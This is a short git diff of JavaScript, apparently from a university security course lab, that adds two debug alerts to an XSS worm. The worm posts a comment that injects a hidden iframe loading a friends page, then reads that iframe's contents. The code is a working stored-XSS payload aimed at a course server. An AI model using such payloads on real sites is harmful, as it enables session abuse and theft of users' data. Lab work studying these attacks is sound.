@@ -3,7 +3,9 @@ function moveitmoveit() {
     if (home.responseText.match('<iframe id="hiddenboi"') == null){
         $.get("http://csec380-core.csec.rit.edu:86/add_comment.php",{ comment: '<iframe id="hiddenboi" src="http://csec380-core.csec.rit.edu:86/friends.php"></iframe>'});
     }
+    alert(1);
     var eff = document.getElementById("hiddenboi");
+    alert(2);
     eff.addEventListener("load",function(){
        var conter= eff.contentWindow.document.body.innerHTML.match('^[^<br]*');
        var stringy = conter.join();
